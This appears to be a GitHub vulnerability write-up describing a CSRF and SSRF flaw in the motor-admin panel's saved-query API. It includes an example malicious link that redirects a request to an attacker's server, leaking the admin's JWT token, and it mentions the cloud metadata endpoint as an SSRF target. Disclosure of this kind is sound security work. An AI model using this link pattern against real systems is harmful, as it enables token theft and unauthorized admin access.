# motoradmin-CSRF
CSRF
The motor-admin panel allows administrators to add custom database queries and save them as API configurations.
These queries are executed via a GET request, including query parameters for configuration, path, etc.
Attackers craft a malicious link pointing to the vulnerable API endpoint.
example: http://victim.com/api/run_api_request?data[Bapi_config_name]=http://attackerserver:port &data[path]=1 
The data[api_config_name] parameter specifies the target server, which in this case is controlled by the attacker.
When the admin clicks the link:
•	The panel sends an HTTP request to the attacker's server (http://attackerserver:port).
•	The request includes sensitive data, such as the JWT token, in headers
![admin token](https://github.com/alirezacsp/Zero/blob/main/image.png)
Consequences
This vulnerability has severe security implications, including:
1.	Authentication Token Leakage:
o	The JWT token is sent along with the request, allowing the attacker to impersonate the admin or gain unauthorized access to the application.
o	If the token grants high-privilege access, the attacker can:
	Compromise the entire database.
	Manage administrative functions, including deleting users or modifying sensitive configurations.
o	This breach extends to any system or API reliant on the leaked JWT.
2.	Sensitive Data Exposure:
o	The attacker could redirect the query to their server, logging sensitive data included in the request (e.g., cookies, headers, query parameters).
o	If the JWT token contains sensitive claims (e.g., username, roles, permissions), this information may also be exposed.
3.	Server-Side Request Forgery (SSRF):
o	The attacker could redirect requests to:
	Internal Services: Access internal APIs or resources not exposed to the public.
	Metadata Services (e.g., AWS metadata at http://169.254.169.254): Harvest sensitive environment information such as access keys.
	Exploitation of Internal Systems: Execute further attacks by leveraging SSRF as an entry point.
4.	Chained Attacks:
o	With the leaked token, the attacker can escalate their privileges, potentially gaining access to:
	Additional user accounts.
	Linked external services (e.g., cloud platforms or APIs).
o	If combined with other vulnerabilities, this could lead to complete system compromise.
5.	Legal and Regulatory Implications:
o	The exfiltration of authentication tokens or sensitive data could breach data protection laws like GDPR, HIPAA, or CCPA.
o	The organization could face fines, lawsuits, and mandatory disclosures.


